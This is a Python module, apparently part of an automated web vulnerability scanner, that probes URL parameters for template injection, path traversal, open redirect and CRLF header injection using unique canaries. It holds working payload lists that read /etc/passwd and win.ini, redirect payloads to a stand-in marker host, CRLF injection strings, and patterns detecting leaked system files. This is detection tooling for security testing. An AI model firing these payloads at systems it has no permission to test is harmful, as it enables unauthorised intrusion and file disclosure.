"""
Differential probes — canary-based detection parity across bug classes.

We already had sharp differential probes for SQLi (``probe_sqli_params``) and XSS
(``probe_xss_reflection``): inject a controlled canary, look for a specific,
low-false-positive signal. Everything else (SSTI, path traversal, open redirect,
CRLF/header injection) fell back to nuclei + freeform LLM testing — higher
false-negative rate. This module brings those classes up to the same standard.

Each probe:
  * injects a **unique arithmetic/marker canary** so a hit is unambiguous (an
    engine evaluating ``{{1009*1013}}`` to ``1022117`` is proof, not a guess),
  * reports structured ``candidates`` the fireteam's finding extractor picks up,
  * uses an **injectable HTTP fetch** (default: ``scanners.run_send_http_request``)
    so the verdict logic is unit-tested against fixtures without a network.

The pure ``_*_hit`` verdict helpers carry the detection logic and are tested
directly; the ``run_*`` drivers just wire them to real requests per parameter.
"""
from __future__ import annotations

import logging
import random
import re
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

logger = logging.getLogger("agent.probes")

# Injectable HTTP: (method, url, headers, body) -> response dict with
# {status, headers, body, redirect_history, error}. Matches
# scanners.run_send_http_request's shape.
HttpFetch = Callable[[str, str, Dict[str, str], str], Dict[str, Any]]


def _default_http(method: str, url: str, headers: Dict[str, str], body: str) -> Dict[str, Any]:
    import json as _json
    import scanners
    return scanners.run_send_http_request(
        method=method, url=url, headers_json=_json.dumps(headers or {}),
        body=body, follow_redirects=False, bridge=None,
    )


def _params_of(url: str) -> List[str]:
    return [k for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)]


def _with_param(url: str, param: str, value: str) -> str:
    parts = urlparse(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[param] = value
    return urlunparse(parts._replace(query=urlencode(q)))


def _headers_lower(resp: Dict[str, Any]) -> Dict[str, str]:
    hdrs = resp.get("headers") or {}
    if not isinstance(hdrs, dict):
        return {}
    return {str(k).lower(): str(v) for k, v in hdrs.items()}


# ---------------------------------------------------------------------------
# Pure verdict helpers (unit-tested directly)
# ---------------------------------------------------------------------------

def _ssti_hit(body: str, product: int, raw_payload_digits: str) -> bool:
    """True if the computed product appears (engine evaluated the expression)
    and it isn't merely the literal operands echoed back."""
    if not body:
        return False
    p = str(product)
    if p not in body:
        return False
    # Guard against coincidental echo: the operands concatenated shouldn't be
    # what we matched (product is distinct from the literal "a*b" digits).
    return p != raw_payload_digits


_TRAVERSAL_SIGNATURES: List[Tuple[str, str]] = [
    (r"root:.*?:0:0:", "unix /etc/passwd (root:...:0:0:)"),
    (r"\[fonts\]|\[extensions\]|for 16-bit app support", "windows win.ini"),
    (r"daemon:.*?:/usr/sbin", "unix /etc/passwd (daemon)"),
]


def _traversal_hit(body: str) -> Optional[str]:
    for pat, label in _TRAVERSAL_SIGNATURES:
        if re.search(pat, body or "", re.IGNORECASE):
            return label
    return None


def _open_redirect_hit(resp: Dict[str, Any], marker_host: str) -> Optional[str]:
    """True if the response redirects off-origin to the attacker marker host."""
    status = resp.get("status")
    hdrs = _headers_lower(resp)
    location = hdrs.get("location", "")
    if isinstance(status, int) and 300 <= status < 400 and location:
        host = urlparse(location if "//" in location else "//" + location.lstrip("/\\")).netloc
        if marker_host in (host or location):
            return f"Location header → {location}"
    # redirect chain (if the fetcher followed it)
    for h in resp.get("redirect_history") or []:
        if marker_host in str(h):
            return f"redirect chain → {h}"
    # client-side redirect in body
    body = resp.get("body") or ""
    if re.search(rf"(location\.(href|replace)|meta[^>]+refresh)[^>]*{re.escape(marker_host)}",
                 body, re.IGNORECASE):
        return "client-side redirect to marker host"
    return None


def _crlf_hit(resp: Dict[str, Any], marker_header: str, marker_value: str) -> bool:
    """True if an injected header materialized in the response headers."""
    hdrs = _headers_lower(resp)
    return hdrs.get(marker_header.lower(), "") == marker_value


# ---------------------------------------------------------------------------
# Drivers
# ---------------------------------------------------------------------------

_SSTI_TEMPLATES = ["{{{0}}}", "${{{0}}}", "#{{{0}}}", "${0}", "#{0}", "<%= {0} %>"]


def run_probe_ssti(target_url: str, params: str = "", fetch: Optional[HttpFetch] = None,
                   rng: Optional[random.Random] = None) -> Dict[str, Any]:
    http = fetch or _default_http
    r = rng or random.Random()
    a, b = r.choice([1009, 1013, 1019]), r.choice([1021, 1031, 1033])
    product = a * b
    expr = f"{a}*{b}"
    param_list = [p.strip() for p in params.split(",") if p.strip()] or _params_of(target_url)
    candidates: List[Dict[str, Any]] = []
    if not param_list:
        return {"probe": "ssti", "target": target_url, "candidates": [],
                "note": "no query parameters to test; pass params=…"}
    for param in param_list:
        for tmpl in _SSTI_TEMPLATES:
            payload = tmpl.format(expr)
            url = _with_param(target_url, param, payload)
            resp = http("GET", url, {}, "")
            if resp.get("error"):
                continue
            if _ssti_hit(resp.get("body") or "", product, f"{a}{b}"):
                candidates.append({
                    "title": f"Server-Side Template Injection in '{param}'",
                    "vuln_type": "ssti", "severity": "high", "url": url,
                    "param": param, "payload": payload,
                    "evidence": f"{expr} evaluated to {product} in the response",
                    "confirmed": True,
                })
                break  # this param confirmed; move on
    return {"probe": "ssti", "target": target_url,
            "tested_params": param_list, "candidates": candidates}


_TRAVERSAL_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
]


def run_probe_path_traversal(target_url: str, params: str = "",
                             fetch: Optional[HttpFetch] = None) -> Dict[str, Any]:
    http = fetch or _default_http
    param_list = [p.strip() for p in params.split(",") if p.strip()] or _params_of(target_url)
    candidates: List[Dict[str, Any]] = []
    if not param_list:
        return {"probe": "path_traversal", "target": target_url, "candidates": [],
                "note": "no query parameters to test; pass params=… (e.g. file,path,template)"}
    for param in param_list:
        for payload in _TRAVERSAL_PAYLOADS:
            url = _with_param(target_url, param, payload)
            resp = http("GET", url, {}, "")
            if resp.get("error"):
                continue
            label = _traversal_hit(resp.get("body") or "")
            if label:
                candidates.append({
                    "title": f"Path Traversal in '{param}'",
                    "vuln_type": "path_traversal", "severity": "high", "url": url,
                    "param": param, "payload": payload,
                    "evidence": f"leaked file signature: {label}", "confirmed": True,
                })
                break
    return {"probe": "path_traversal", "target": target_url,
            "tested_params": param_list, "candidates": candidates}


_REDIRECT_MARKER = "aeg-redir-canary.example"
_REDIRECT_PAYLOADS = [
    f"https://{_REDIRECT_MARKER}/",
    f"//{_REDIRECT_MARKER}/",
    f"https:/{_REDIRECT_MARKER}",
    f"/\\{_REDIRECT_MARKER}",
    f"https://trusted@{_REDIRECT_MARKER}/",
]


def run_probe_open_redirect(target_url: str, params: str = "",
                            fetch: Optional[HttpFetch] = None) -> Dict[str, Any]:
    http = fetch or _default_http
    hint = ("next", "url", "redirect", "return", "returnUrl", "dest", "destination",
            "continue", "r", "u", "to")
    param_list = [p.strip() for p in params.split(",") if p.strip()] or _params_of(target_url)
    if not param_list:
        param_list = list(hint)  # try common redirect param names against the URL
    candidates: List[Dict[str, Any]] = []
    for param in param_list:
        for payload in _REDIRECT_PAYLOADS:
            url = _with_param(target_url, param, payload)
            resp = http("GET", url, {}, "")
            if resp.get("error"):
                continue
            why = _open_redirect_hit(resp, _REDIRECT_MARKER)
            if why:
                candidates.append({
                    "title": f"Open Redirect via '{param}'",
                    "vuln_type": "open_redirect", "severity": "medium", "url": url,
                    "param": param, "payload": payload, "evidence": why, "confirmed": True,
                })
                break
    return {"probe": "open_redirect", "target": target_url,
            "tested_params": param_list, "candidates": candidates}


def run_probe_crlf(target_url: str, params: str = "",
                   fetch: Optional[HttpFetch] = None) -> Dict[str, Any]:
    http = fetch or _default_http
    marker_hdr, marker_val = "X-Aeg-Inj", "crlf" + "1337"
    injections = [
        f"%0d%0a{marker_hdr}:%20{marker_val}",
        f"%0d%0a%20{marker_hdr}:{marker_val}",
        f"\r\n{marker_hdr}: {marker_val}",
        f"%E5%98%8D%E5%98%8A{marker_hdr}:%20{marker_val}",  # unicode CRLF
    ]
    param_list = [p.strip() for p in params.split(",") if p.strip()] or _params_of(target_url)
    candidates: List[Dict[str, Any]] = []
    if not param_list:
        return {"probe": "crlf", "target": target_url, "candidates": [],
                "note": "no query parameters to test; pass params=…"}
    for param in param_list:
        for payload in injections:
            url = _with_param(target_url, param, payload)
            resp = http("GET", url, {}, "")
            if resp.get("error"):
                continue
            if _crlf_hit(resp, marker_hdr, marker_val):
                candidates.append({
                    "title": f"CRLF / HTTP Response Header Injection in '{param}'",
                    "vuln_type": "crlf", "severity": "medium", "url": url,
                    "param": param, "payload": payload,
                    "evidence": f"injected header {marker_hdr}: {marker_val} reflected",
                    "confirmed": True,
                })
                break
    return {"probe": "crlf", "target": target_url,
            "tested_params": param_list, "candidates": candidates}


__all__ = [
    "run_probe_ssti",
    "run_probe_path_traversal",
    "run_probe_open_redirect",
    "run_probe_crlf",
    "_ssti_hit",
    "_traversal_hit",
    "_open_redirect_hit",
    "_crlf_hit",
]
